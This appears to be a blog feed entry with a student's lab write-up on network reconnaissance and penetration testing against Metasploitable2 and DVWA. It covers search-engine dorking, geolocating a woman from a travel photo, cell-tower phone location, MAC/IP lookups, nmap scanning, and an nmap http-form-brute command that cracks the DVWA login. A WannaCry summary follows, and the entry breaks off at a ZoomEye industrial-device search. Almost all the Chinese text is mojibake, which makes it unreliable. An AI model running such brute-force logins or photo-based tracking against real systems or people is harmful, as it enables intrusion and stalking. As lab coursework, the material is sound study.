      <title>ç½‘ç»œæ¸—é€æµ‹è¯•å®éªŒåˆé›†</title>
      <link href="/posts/60018/"/>
      <url>/posts/60018/</url>
      
        <content type="html"><![CDATA[<h1 id="ç½‘ç»œæ¸—é€æµ‹è¯•å®éªŒä¸€ï¼šç½‘ç»œæ‰«æä¸ç½‘ç»œä¾¦å¯Ÿ"><a href="#ç½‘ç»œæ¸—é€æµ‹è¯•å®éªŒä¸€ï¼šç½‘ç»œæ‰«æä¸ç½‘ç»œä¾¦å¯Ÿ" class="headerlink" title="ç½‘ç»œæ¸—é€æµ‹è¯•å®éªŒä¸€ï¼šç½‘ç»œæ‰«æä¸ç½‘ç»œä¾¦å¯Ÿ"></a>ç½‘ç»œæ¸—é€æµ‹è¯•å®éªŒä¸€ï¼šç½‘ç»œæ‰«æä¸ç½‘ç»œä¾¦å¯Ÿ</h1><h2 id="å®éªŒç›®çš„"><a href="#å®éªŒç›®çš„" class="headerlink" title="å®éªŒç›®çš„"></a>å®éªŒç›®çš„</h2><ul><li>ç†è§£ç½‘ç»œæ‰«æã€ç½‘ç»œä¾¦å¯Ÿçš„ä½œç”¨ï¼›é€šè¿‡æ­å»ºç½‘ç»œæ¸—é€æµ‹è¯•å¹³å°ï¼Œäº†è§£å¹¶ç†Ÿæ‚‰å¸¸ç”¨æœç´¢å¼•æ“ã€æ‰«æå·¥å…·çš„åº”ç”¨ï¼Œé€šè¿‡ä¿¡æ¯æ”¶é›†ä¸ºä¸‹ä¸€æ­¥æ¸—é€å·¥ä½œæ‰“ä¸‹åŸºç¡€ã€‚</li></ul><h2 id="ç³»ç»Ÿç¯å¢ƒ"><a href="#ç³»ç»Ÿç¯å¢ƒ" class="headerlink" title="ç³»ç»Ÿç¯å¢ƒ"></a>ç³»ç»Ÿç¯å¢ƒ</h2><ul><li>Kali Linux 2ã€Windows</li></ul><h2 id="ç½‘ç»œç¯å¢ƒ"><a href="#ç½‘ç»œç¯å¢ƒ" class="headerlink" title="ç½‘ç»œç¯å¢ƒ"></a>ç½‘ç»œç¯å¢ƒ</h2><ul><li>äº¤æ¢ç½‘ç»œç»“æ„</li></ul><h2 id="å®éªŒå·¥å…·"><a href="#å®éªŒå·¥å…·" class="headerlink" title="å®éªŒå·¥å…·"></a>å®éªŒå·¥å…·</h2><ul><li>Metasploitable2ï¼ˆéœ€è‡ªè¡Œä¸‹è½½è™šæ‹Ÿæœºé•œåƒï¼‰ï¼›Nmapï¼ˆKaliè‡ªå¸¦ï¼‰ï¼›WinHexã€æ•°æ®æ¢å¤è½¯ä»¶ç­‰</li></ul><h2 id="å®éªŒæ­¥éª¤"><a href="#å®éªŒæ­¥éª¤" class="headerlink" title="å®éªŒæ­¥éª¤"></a>å®éªŒæ­¥éª¤</h2><h3 id="1-ç”¨æœç´¢å¼•æ“Googleæˆ–ç™¾åº¦æœç´¢éº»çœç†å·¥å­¦é™¢ç½‘ç«™ä¸­æ–‡ä»¶ååŒ…å«â€œnetwork-securityâ€çš„pdfæ–‡æ¡£ï¼Œæˆªå›¾æœç´¢å¾—åˆ°çš„é¡µé¢"><a href="#1-ç”¨æœç´¢å¼•æ“Googleæˆ–ç™¾åº¦æœç´¢éº»çœç†å·¥å­¦é™¢ç½‘ç«™ä¸­æ–‡ä»¶ååŒ…å«â€œnetwork-securityâ€çš„pdfæ–‡æ¡£ï¼Œæˆªå›¾æœç´¢å¾—åˆ°çš„é¡µé¢" class="headerlink" title="1. ç”¨æœç´¢å¼•æ“Googleæˆ–ç™¾åº¦æœç´¢éº»çœç†å·¥å­¦é™¢ç½‘ç«™ä¸­æ–‡ä»¶ååŒ…å«â€œnetwork securityâ€çš„pdfæ–‡æ¡£ï¼Œæˆªå›¾æœç´¢å¾—åˆ°çš„é¡µé¢"></a>1. ç”¨æœç´¢å¼•æ“Googleæˆ–ç™¾åº¦æœç´¢éº»çœç†å·¥å­¦é™¢ç½‘ç«™ä¸­æ–‡ä»¶ååŒ…å«â€œnetwork securityâ€çš„pdfæ–‡æ¡£ï¼Œæˆªå›¾æœç´¢å¾—åˆ°çš„é¡µé¢</h3><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026200649.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">&quot;network security&quot; filetype:pdf site:www.mit.edu/</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026201030.png"></p><blockquote><p>æœç´¢å†…å®¹+ â€œ2019â€</p><p><code>+</code>å·è¡¨ç¤ºåŒæ—¶æ»¡è¶³è¿™ä¸ªåŠ å·åé¢çš„å…³é”®è¯</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026193716.png" alt="+ &quot;&quot;"></p><h3 id="2-ç…§ç‰‡ä¸­çš„å¥³ç”Ÿåœ¨å“ªé‡Œæ—…è¡Œï¼Ÿæˆªå›¾æœç´¢åˆ°çš„åœ°å€ä¿¡æ¯"><a href="#2-ç…§ç‰‡ä¸­çš„å¥³ç”Ÿåœ¨å“ªé‡Œæ—…è¡Œï¼Ÿæˆªå›¾æœç´¢åˆ°çš„åœ°å€ä¿¡æ¯" class="headerlink" title="2. ç…§ç‰‡ä¸­çš„å¥³ç”Ÿåœ¨å“ªé‡Œæ—…è¡Œï¼Ÿæˆªå›¾æœç´¢åˆ°çš„åœ°å€ä¿¡æ¯"></a>2. ç…§ç‰‡ä¸­çš„å¥³ç”Ÿåœ¨å“ªé‡Œæ—…è¡Œï¼Ÿæˆªå›¾æœç´¢åˆ°çš„åœ°å€ä¿¡æ¯</h3><blockquote><p>è€ç¤¾å·¥äº†</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026201318.jpg" alt="å›¾ç‰‡"></p><blockquote><p>è°·æ­Œåœ°å›¾å…³é”®å­—ï¼šCafe-Brasserie-LeTrentehuit</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026205946.jpg"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026210123.png"></p><h3 id="3-æ‰‹æœºä½ç½®å®šä½ã€‚é€šè¿‡LACï¼ˆLocation-Area-Codeï¼Œä½ç½®åŒºåŸŸç ï¼‰å’ŒCIDï¼ˆCell-Identityï¼ŒåŸºç«™ç¼–å·ï¼Œæ˜¯ä¸ª16ä½çš„æ•°æ®ï¼ˆèŒƒå›´æ˜¯0åˆ°65535ï¼‰å¯ä»¥æŸ¥è¯¢æ‰‹æœºæ¥å…¥çš„åŸºç«™çš„ä½ç½®ï¼Œä»è€Œåˆæ­¥ç¡®å®šæ‰‹æœºç”¨æˆ·çš„ä½ç½®"><a href="#3-æ‰‹æœºä½ç½®å®šä½ã€‚é€šè¿‡LACï¼ˆLocation-Area-Codeï¼Œä½ç½®åŒºåŸŸç ï¼‰å’ŒCIDï¼ˆCell-Identityï¼ŒåŸºç«™ç¼–å·ï¼Œæ˜¯ä¸ª16ä½çš„æ•°æ®ï¼ˆèŒƒå›´æ˜¯0åˆ°65535ï¼‰å¯ä»¥æŸ¥è¯¢æ‰‹æœºæ¥å…¥çš„åŸºç«™çš„ä½ç½®ï¼Œä»è€Œåˆæ­¥ç¡®å®šæ‰‹æœºç”¨æˆ·çš„ä½ç½®" class="headerlink" title="3. æ‰‹æœºä½ç½®å®šä½ã€‚é€šè¿‡LACï¼ˆLocation Area Codeï¼Œä½ç½®åŒºåŸŸç ï¼‰å’ŒCIDï¼ˆCell Identityï¼ŒåŸºç«™ç¼–å·ï¼Œæ˜¯ä¸ª16ä½çš„æ•°æ®ï¼ˆèŒƒå›´æ˜¯0åˆ°65535ï¼‰å¯ä»¥æŸ¥è¯¢æ‰‹æœºæ¥å…¥çš„åŸºç«™çš„ä½ç½®ï¼Œä»è€Œåˆæ­¥ç¡®å®šæ‰‹æœºç”¨æˆ·çš„ä½ç½®"></a>3. æ‰‹æœºä½ç½®å®šä½ã€‚é€šè¿‡LACï¼ˆLocation Area Codeï¼Œä½ç½®åŒºåŸŸç ï¼‰å’ŒCIDï¼ˆCell Identityï¼ŒåŸºç«™ç¼–å·ï¼Œæ˜¯ä¸ª16ä½çš„æ•°æ®ï¼ˆèŒƒå›´æ˜¯0åˆ°65535ï¼‰å¯ä»¥æŸ¥è¯¢æ‰‹æœºæ¥å…¥çš„åŸºç«™çš„ä½ç½®ï¼Œä»è€Œåˆæ­¥ç¡®å®šæ‰‹æœºç”¨æˆ·çš„ä½ç½®</h3><ul><li><p>è·å–è‡ªå·±æ‰‹æœºçš„LACå’ŒCIDï¼š</p><p>Android è·å–æ–¹æ³•ï¼šAndroidï¼š æ‹¨å·*#*#4636#*#*è¿›å…¥æ‰‹æœºä¿¡æ¯å·¥ç¨‹æ¨¡å¼åæŸ¥çœ‹</p><p>iphoneè·å–æ–¹æ³•ï¼šiPhoneï¼šæ‹¨å·*3001#12345#*è¿›å…¥FieldTest</p><p>Serving Cell infoâ€“&gt;LAC&#x3D;Tracking Area Code â€“&gt;cellid &#x3D; Cell identity</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026211506.png"></p></li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026211423.png"></p><h3 id="4-ç¼–ç è§£ç "><a href="#4-ç¼–ç è§£ç " class="headerlink" title="4. ç¼–ç è§£ç "></a>4. ç¼–ç è§£ç </h3><ul><li>å°†Z29vZCBnb29kIHN0dWR5IQ&#x3D;&#x3D;è§£ç ã€‚æˆªå›¾ã€‚</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026213526.png"></p><h3 id="5-åœ°å€ä¿¡æ¯"><a href="#5-åœ°å€ä¿¡æ¯" class="headerlink" title="5. åœ°å€ä¿¡æ¯"></a>5. åœ°å€ä¿¡æ¯</h3><h4 id="5-1-å†…ç½‘ä¸­æ•è·åˆ°ä¸€ä¸ªä»¥å¤ªå¸§ï¼ŒæºMACåœ°å€ä¸ºï¼š98-CA-33-02-27-B5ï¼›ç›®çš„IPåœ°å€ä¸ºï¼š202-193-64-34ï¼Œå›ç­”é—®é¢˜ï¼šè¯¥ç”¨æˆ·ä½¿ç”¨çš„ä»€ä¹ˆå“ç‰Œçš„è®¾å¤‡ï¼Œè®¿é—®çš„æ˜¯ä»€ä¹ˆç½‘ç«™ï¼Ÿå¹¶é™„æˆªå›¾ã€‚"><a href="#5-1-å†…ç½‘ä¸­æ•è·åˆ°ä¸€ä¸ªä»¥å¤ªå¸§ï¼ŒæºMACåœ°å€ä¸ºï¼š98-CA-33-02-27-B5ï¼›ç›®çš„IPåœ°å€ä¸ºï¼š202-193-64-34ï¼Œå›ç­”é—®é¢˜ï¼šè¯¥ç”¨æˆ·ä½¿ç”¨çš„ä»€ä¹ˆå“ç‰Œçš„è®¾å¤‡ï¼Œè®¿é—®çš„æ˜¯ä»€ä¹ˆç½‘ç«™ï¼Ÿå¹¶é™„æˆªå›¾ã€‚" class="headerlink" title="5.1 å†…ç½‘ä¸­æ•è·åˆ°ä¸€ä¸ªä»¥å¤ªå¸§ï¼ŒæºMACåœ°å€ä¸ºï¼š98-CA-33-02-27-B5ï¼›ç›®çš„IPåœ°å€ä¸ºï¼š202.193.64.34ï¼Œå›ç­”é—®é¢˜ï¼šè¯¥ç”¨æˆ·ä½¿ç”¨çš„ä»€ä¹ˆå“ç‰Œçš„è®¾å¤‡ï¼Œè®¿é—®çš„æ˜¯ä»€ä¹ˆç½‘ç«™ï¼Ÿå¹¶é™„æˆªå›¾ã€‚"></a>5.1 å†…ç½‘ä¸­æ•è·åˆ°ä¸€ä¸ªä»¥å¤ªå¸§ï¼ŒæºMACåœ°å€ä¸ºï¼š98-CA-33-02-27-B5ï¼›ç›®çš„IPåœ°å€ä¸ºï¼š202.193.64.34ï¼Œå›ç­”é—®é¢˜ï¼šè¯¥ç”¨æˆ·ä½¿ç”¨çš„ä»€ä¹ˆå“ç‰Œçš„è®¾å¤‡ï¼Œè®¿é—®çš„æ˜¯ä»€ä¹ˆç½‘ç«™ï¼Ÿå¹¶é™„æˆªå›¾ã€‚</h4><blockquote><p> çŒœéƒ½èƒ½çŒœåˆ°æ˜¯å§šè€å¸ˆæ‹¿è‡ªå·±çš„æ‰‹æœºè®¿é—®æ¡‚ç”µâ€¦â€¦</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026215914.png" alt="MAC"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026220031.png"></p><h4 id="5-2-è®¿é—®https-whatismyipaddress-comå¾—åˆ°MyIPä¿¡æ¯ï¼Œåˆ©ç”¨ipconfig-Windows-æˆ–ifconfig-Linux-æŸ¥çœ‹æœ¬æœºIPåœ°å€ï¼Œä¸¤è€…å€¼ç›¸åŒå—ï¼Ÿå¦‚æœä¸ç›¸åŒçš„è¯ï¼Œè¯´æ˜åŸå› ã€‚"><a href="#5-2-è®¿é—®https-whatismyipaddress-comå¾—åˆ°MyIPä¿¡æ¯ï¼Œåˆ©ç”¨ipconfig-Windows-æˆ–ifconfig-Linux-æŸ¥çœ‹æœ¬æœºIPåœ°å€ï¼Œä¸¤è€…å€¼ç›¸åŒå—ï¼Ÿå¦‚æœä¸ç›¸åŒçš„è¯ï¼Œè¯´æ˜åŸå› ã€‚" class="headerlink" title="5.2 è®¿é—®https://whatismyipaddress.comå¾—åˆ°MyIPä¿¡æ¯ï¼Œåˆ©ç”¨ipconfig(Windows)æˆ–ifconfig(Linux)æŸ¥çœ‹æœ¬æœºIPåœ°å€ï¼Œä¸¤è€…å€¼ç›¸åŒå—ï¼Ÿå¦‚æœä¸ç›¸åŒçš„è¯ï¼Œè¯´æ˜åŸå› ã€‚"></a>5.2 è®¿é—®<a href="https://whatismyipaddress.comå¾—åˆ°MyIPä¿¡æ¯ï¼Œåˆ©ç”¨ipconfig(Windows)æˆ–ifconfig(Linux)æŸ¥çœ‹æœ¬æœºIPåœ°å€ï¼Œä¸¤è€…å€¼ç›¸åŒå—ï¼Ÿå¦‚æœä¸ç›¸åŒçš„è¯ï¼Œè¯´æ˜åŸå› ã€‚">https://whatismyipaddress.comå¾—åˆ°MyIPä¿¡æ¯ï¼Œåˆ©ç”¨ipconfig(Windows)æˆ–ifconfig(Linux)æŸ¥çœ‹æœ¬æœºIPåœ°å€ï¼Œä¸¤è€…å€¼ç›¸åŒå—ï¼Ÿå¦‚æœä¸ç›¸åŒçš„è¯ï¼Œè¯´æ˜åŸå› ã€‚</a></h4><blockquote><p>å…¬ç½‘ ip æ‰“ç äº†ï¼Œæ€•è¢«æ</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106002812.png" alt="MyIP"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026220321.png" alt="ipconifg"></p><blockquote><p>ä¸ç›¸åŒï¼Œå› ä¸ºç½‘ç«™æŸ¥è¯¢åˆ°çš„æ˜¯å…¬ç½‘IPï¼ŒipconfigæŸ¥è¯¢åˆ°çš„æ˜¯å†…ç½‘IP</p></blockquote><h3 id="6-NMAPçš„ä½¿ç”¨"><a href="#6-NMAPçš„ä½¿ç”¨" class="headerlink" title="6. NMAPçš„ä½¿ç”¨"></a>6. NMAPçš„ä½¿ç”¨</h3><h4 id="6-1åˆ©ç”¨NMAPæ‰«æMetasploitable2ï¼ˆéœ€ä¸‹è½½è™šæ‹Ÿæœºé•œåƒï¼‰çš„ç«¯å£å¼€æ”¾æƒ…å†µã€‚å¹¶é™„æˆªå›¾ã€‚è¯´æ˜å…¶ä¸­å››ä¸ªç«¯å£çš„æä¾›çš„æœåŠ¡ï¼ŒæŸ¥é˜…èµ„æ–™ï¼Œç®€è¦è¯´æ˜è¯¥æœåŠ¡çš„åŠŸèƒ½ã€‚"><a href="#6-1åˆ©ç”¨NMAPæ‰«æMetasploitable2ï¼ˆéœ€ä¸‹è½½è™šæ‹Ÿæœºé•œåƒï¼‰çš„ç«¯å£å¼€æ”¾æƒ…å†µã€‚å¹¶é™„æˆªå›¾ã€‚è¯´æ˜å…¶ä¸­å››ä¸ªç«¯å£çš„æä¾›çš„æœåŠ¡ï¼ŒæŸ¥é˜…èµ„æ–™ï¼Œç®€è¦è¯´æ˜è¯¥æœåŠ¡çš„åŠŸèƒ½ã€‚" class="headerlink" title="6.1åˆ©ç”¨NMAPæ‰«æMetasploitable2ï¼ˆéœ€ä¸‹è½½è™šæ‹Ÿæœºé•œåƒï¼‰çš„ç«¯å£å¼€æ”¾æƒ…å†µã€‚å¹¶é™„æˆªå›¾ã€‚è¯´æ˜å…¶ä¸­å››ä¸ªç«¯å£çš„æä¾›çš„æœåŠ¡ï¼ŒæŸ¥é˜…èµ„æ–™ï¼Œç®€è¦è¯´æ˜è¯¥æœåŠ¡çš„åŠŸèƒ½ã€‚"></a>6.1åˆ©ç”¨NMAPæ‰«æMetasploitable2ï¼ˆéœ€ä¸‹è½½è™šæ‹Ÿæœºé•œåƒï¼‰çš„ç«¯å£å¼€æ”¾æƒ…å†µã€‚å¹¶é™„æˆªå›¾ã€‚è¯´æ˜å…¶ä¸­å››ä¸ªç«¯å£çš„æä¾›çš„æœåŠ¡ï¼ŒæŸ¥é˜…èµ„æ–™ï¼Œç®€è¦è¯´æ˜è¯¥æœåŠ¡çš„åŠŸèƒ½ã€‚</h4><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201027000326.png" alt="æ‰«æç«¯å£"></p><h5 id="21ç«¯å£ftpæ–‡ä»¶ä¼ è¾“åè®®"><a href="#21ç«¯å£ftpæ–‡ä»¶ä¼ è¾“åè®®" class="headerlink" title="21ç«¯å£ftpæ–‡ä»¶ä¼ è¾“åè®®"></a>21ç«¯å£ftpæ–‡ä»¶ä¼ è¾“åè®®</h5><p>è¯¥åè®®æ˜¯Internetæ–‡ä»¶ä¼ é€çš„åŸºç¡€ï¼Œå®ƒç”±ä¸€ç³»åˆ—è§„æ ¼è¯´æ˜æ–‡æ¡£ç»„æˆï¼Œç›®æ ‡æ˜¯æé«˜æ–‡ä»¶çš„å…±äº«æ€§ï¼Œæä¾›éç›´æ¥ä½¿ç”¨è¿œç¨‹è®¡ç®—æœºï¼Œä½¿å­˜å‚¨ä»‹è´¨å¯¹ç”¨æˆ·é€æ˜å’Œå¯é é«˜æ•ˆåœ°ä¼ é€æ•°æ®ã€‚<br> åŠŸèƒ½ï¼š<br> æœåŠ¡å™¨çš„ä¸Šä¼   å’Œä¸‹è½½ï¼ŒInternetä¸Šçš„æ§åˆ¶æ–‡ä»¶çš„åŒå‘ä¼ è¾“ã€‚åŒæ—¶ï¼Œå®ƒä¹Ÿæ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼ˆApplicationï¼‰ã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡å®ƒæŠŠè‡ªå·±çš„PCæœºä¸ä¸–ç•Œå„åœ°æ‰€æœ‰è¿è¡ŒFTPåè®®çš„æœåŠ¡å™¨ç›¸è¿ï¼Œè®¿é—®æœåŠ¡å™¨ä¸Šçš„å¤§é‡ç¨‹åºå’Œä¿¡æ¯ã€‚å®ç°å„ç§æ“ä½œç³»ç»Ÿä¹‹é—´çš„æ–‡ä»¶äº¤æµï¼Œå»ºç«‹ä¸€ä¸ªç»Ÿä¸€çš„æ–‡ä»¶ä¼ è¾“åè®®ã€‚<br> FTPçš„ä¼ è¾“æœ‰ä¸¤ç§æ–¹å¼ï¼šASCIIä¼ è¾“æ¨¡å¼å’ŒäºŒè¿›åˆ¶æ•°æ®ä¼ è¾“æ¨¡å¼</p><h5 id="22ç«¯å£sshæœåŠ¡"><a href="#22ç«¯å£sshæœåŠ¡" class="headerlink" title="22ç«¯å£sshæœåŠ¡"></a>22ç«¯å£sshæœåŠ¡</h5><p>åœ¨è¿›è¡Œæ•°æ®ä¼ è¾“ä¹‹å‰ï¼ŒSSHå…ˆå¯¹è”æœºæ•°æ®åŒ…é€šè¿‡åŠ å¯†æŠ€æœ¯è¿›è¡ŒåŠ å¯†å¤„ç†ï¼ŒåŠ å¯†ååœ¨è¿›è¡Œæ•°æ®ä¼ è¾“ã€‚ç¡®ä¿äº†ä¼ é€’çš„æ•°æ®å®‰å…¨ã€‚SSHæ˜¯ä¸“ä¸ºè¿œç¨‹ç™»å½•ä¼šè¯å’Œå…¶ä»–ç½‘ç»œæœåŠ¡æä¾›çš„å®‰å…¨æ€§åè®®ã€‚åˆ©ç”¨ SSH åè®®å¯ä»¥æœ‰æ•ˆçš„é˜²æ­¢è¿œç¨‹ç®¡ç†è¿‡ç¨‹ä¸­çš„ä¿¡æ¯æ³„éœ²é—®é¢˜ï¼Œåœ¨å½“å‰çš„ç”Ÿäº§ç¯å¢ƒè¿ç»´å·¥ä½œä¸­ï¼Œç»å¤§å¤šæ•°ä¼ä¸šæ™®éé‡‡ç”¨SSHåè®®æœåŠ¡æ¥ä»£æ›¿ä¼ ç»Ÿçš„ä¸å®‰å…¨çš„è¿œç¨‹è”æœºæœåŠ¡è½¯ä»¶ï¼Œå¦‚telnet(23ç«¯å£ï¼ŒéåŠ å¯†çš„)ç­‰ã€‚</p><p>SSHè¿˜èƒ½æä¾›ç±»ä¼¼FTPæœåŠ¡çš„sftp-server,å€ŸåŠ©SSHåè®®æ¥ä¼ è¾“æ•°æ®çš„.æä¾›æ›´å®‰å…¨çš„SFTPæœåŠ¡</p><h5 id="23ç«¯å£telnetè¿œç¨‹ç™»é™†æœåŠ¡"><a href="#23ç«¯å£telnetè¿œç¨‹ç™»é™†æœåŠ¡" class="headerlink" title="23ç«¯å£telnetè¿œç¨‹ç™»é™†æœåŠ¡"></a>23ç«¯å£telnetè¿œç¨‹ç™»é™†æœåŠ¡</h5><p>telnetæœåŠ¡å±äºå…¸å‹çš„å®¢æˆ·æœº&#x2F;æœåŠ¡å™¨æ¨¡å‹ï¼Œå½“ç”¨telnetç™»å½•è¿œç¨‹è®¡ç®—æœºçš„æ—¶å€™ï¼Œå®é™…ä¸Šå¯åŠ¨äº†ä¸¤ä¸ªç¨‹åºï¼šè¿è¡Œåœ¨æœ¬åœ°è®¡ç®—æœºçš„telnetå®¢æˆ·ç«¯ç¨‹åºï¼›è¿è¡Œåœ¨ç™»å½•çš„è¿œç¨‹è®¡ç®—æœºä¸Šçš„telnetæœåŠ¡ç¨‹åº</p><h5 id="53ç«¯å£DNSåŸŸåè§£ææœåŠ¡"><a href="#53ç«¯å£DNSåŸŸåè§£ææœåŠ¡" class="headerlink" title="53ç«¯å£DNSåŸŸåè§£ææœåŠ¡"></a>53ç«¯å£DNSåŸŸåè§£ææœåŠ¡</h5><p>æ‰€æä¾›çš„æœåŠ¡æ˜¯ç”¨æ¥å°†ä¸»æœºåå’ŒåŸŸåè½¬æ¢ä¸ºIPåœ°å€</p><h4 id="6-2åˆ©ç”¨NMAPæ‰«æMetasploitable2çš„æ“ä½œç³»ç»Ÿç±»å‹ï¼Œå¹¶é™„æˆªå›¾ã€‚"><a href="#6-2åˆ©ç”¨NMAPæ‰«æMetasploitable2çš„æ“ä½œç³»ç»Ÿç±»å‹ï¼Œå¹¶é™„æˆªå›¾ã€‚" class="headerlink" title="6.2åˆ©ç”¨NMAPæ‰«æMetasploitable2çš„æ“ä½œç³»ç»Ÿç±»å‹ï¼Œå¹¶é™„æˆªå›¾ã€‚"></a>6.2åˆ©ç”¨NMAPæ‰«æMetasploitable2çš„æ“ä½œç³»ç»Ÿç±»å‹ï¼Œå¹¶é™„æˆªå›¾ã€‚</h4><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201027105858.png" alt="OS"></p><h4 id="6-3-åˆ©ç”¨NMAPç©·ä¸¾-Metasploitable2ä¸Š-dvwa-çš„ç™»å½•è´¦å·å’Œå¯†ç ã€‚"><a href="#6-3-åˆ©ç”¨NMAPç©·ä¸¾-Metasploitable2ä¸Š-dvwa-çš„ç™»å½•è´¦å·å’Œå¯†ç ã€‚" class="headerlink" title="6.3 åˆ©ç”¨NMAPç©·ä¸¾ Metasploitable2ä¸Š dvwa çš„ç™»å½•è´¦å·å’Œå¯†ç ã€‚"></a>6.3 åˆ©ç”¨NMAPç©·ä¸¾ Metasploitable2ä¸Š dvwa çš„ç™»å½•è´¦å·å’Œå¯†ç ã€‚</h4><p>Nmap è‡ªå¸¦æœ‰ä¸€äº›è„šæœ¬ï¼Œå¯ä»¥ç”¨æ¥æ¢æµ‹ç™»é™†ç•Œé¢æˆ–çˆ†ç ´ç™»é™†ç•Œé¢ï¼Œé¦–å…ˆåˆ¤æ–­ dvwa åœ¨ 80 ç«¯å£ä¸Šï¼Œç”¨<code>http-auth-finder</code>è„šæœ¬æ¢æµ‹ç«™ç‚¹ä¸Šçš„ç™»å½•æˆæƒé¡µé¢ï¼Œå‘ç°<code>/dvwa/login.php</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201027181338.png"></p><p>æ‰¾åˆ°å’Œç™»å½•æˆæƒæœ‰å…³çš„é¡µé¢ï¼Œå°è¯•ä½¿ç”¨ç±»ä¼¼äº<code>http-form-brute</code>çš„è„šæœ¬çˆ†ç ´å‡ºä¸€äº›è´¦æˆ·å¯†ç ï¼Œ<code>http-form-brute</code> ä¼ å‚<code>--script-args=http-form-brute.path=/dvwa/login.php 192.168.10.227</code>è¿›è¡Œçˆ†ç ´ï¼Œå¾—åˆ°è´¦å·<code>admin</code>å¯†ç <code>password</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201027182031.png"></p><h4 id="6-4-æŸ¥é˜…èµ„æ–™ï¼Œæ°¸æ’ä¹‹è“-WannaCryè •è™«åˆ©ç”¨æ¼æ´çš„ç›¸å…³ä¿¡æ¯ã€‚"><a href="#6-4-æŸ¥é˜…èµ„æ–™ï¼Œæ°¸æ’ä¹‹è“-WannaCryè •è™«åˆ©ç”¨æ¼æ´çš„ç›¸å…³ä¿¡æ¯ã€‚" class="headerlink" title="6.4 æŸ¥é˜…èµ„æ–™ï¼Œæ°¸æ’ä¹‹è“-WannaCryè •è™«åˆ©ç”¨æ¼æ´çš„ç›¸å…³ä¿¡æ¯ã€‚"></a>6.4 æŸ¥é˜…èµ„æ–™ï¼Œæ°¸æ’ä¹‹è“-WannaCryè •è™«åˆ©ç”¨æ¼æ´çš„ç›¸å…³ä¿¡æ¯ã€‚</h4><p>è •è™«ç—…æ¯’ä¼šé€šè¿‡è¿œç¨‹æœåŠ¡å™¨å’Œè‡ªèº«çˆ¬è™«åŠŸèƒ½æ”¶é›†å±€åŸŸç½‘å†…çš„IPåˆ—è¡¨ï¼Œç„¶åå¯¹å…¶ä¸­çš„å¤šä¸ªæœåŠ¡ç«¯å£å‘èµ·æ”»å‡»ï¼ŒåŒ…æ‹¬RPCæœåŠ¡(135ç«¯å£)ã€SQLServeræœåŠ¡(1433ç«¯å£)ã€FTPæœåŠ¡(21ç«¯å£)ï¼ŒåŒæ—¶è¿˜ä¼šé€šè¿‡ â€œæ°¸æ’ä¹‹è“â€æ¼æ´ï¼Œå…¥ä¾µ445ç«¯å£ï¼Œæ”»å‡»ç”µè„‘ã€‚</p><p>è¯¥ç—…æ¯’é’ˆå¯¹ä¼ä¸šä¸ä¾¿å…³é—­çš„å¤šä¸ªå¸¸ç”¨ç«¯å£è¿›è¡Œæ”»å‡»ï¼Œå¹¶ä¸”åˆ©ç”¨äº†å±€åŸŸç½‘ç”µè„‘ä¸­æ™®éæœªä¿®å¤çš„â€æ°¸æ’ä¹‹è“â€æ¼æ´ï¼Œä¸€æ—¦ä»»ä½•ä¸€å°ç”µè„‘è¢«è¯¥ç—…æ¯’æ„ŸæŸ“ï¼Œå°†æ„å‘³ç€å±€åŸŸç½‘å†…æ‰€æœ‰ç”µè„‘éƒ½é¢ä¸´è¢«æ„ŸæŸ“çš„é£é™©ï¼Œå°¤å…¶ç»™æ”¿ä¼æœºæ„ç”¨æˆ·é€ æˆæå¤§å¨èƒã€‚ </p><p>å¦‚æœç—…æ¯’æˆåŠŸå…¥ä¾µæˆ–æ”»å‡»ç«¯å£ï¼Œå°±ä¼šä»è¿œç¨‹æœåŠ¡å™¨ä¸‹è½½ç—…æ¯’ä»£ç ï¼Œè¿›è€Œæ¨ªå‘ä¼ æ’­ç»™å±€åŸŸç½‘å†…å…¶ä»–ç”µè„‘ã€‚åŒæ—¶ï¼Œè¯¥ç—…æ¯’è¿˜ä¼šåœ¨è¢«æ„ŸæŸ“ç”µè„‘ä¸­ç•™ä¸‹åé—¨ç—…æ¯’ï¼Œä»¥å‡†å¤‡è¿›è¡Œåç»­çš„æ¶æ„æ”»å‡»ï¼Œä¸æ’é™¤æœªæ¥ä¼šå‘ç”¨æˆ·ç”µè„‘ä¼ æ’­æ›´å…·å¨èƒæ€§ç—…æ¯’çš„å¯èƒ½æ€§ï¼Œä¾‹å¦‚å‹’ç´¢ç—…æ¯’ç­‰</p><h3 id="7ã€åˆ©ç”¨-ZoomEye-æœç´¢ä¸€ä¸ªè¥¿é—¨å­å…¬å¸å·¥æ§è®¾å¤‡ï¼Œå¹¶æè¿°å…¶å¯èƒ½å­˜åœ¨çš„å®‰å…¨é—®é¢˜ã€‚"><a 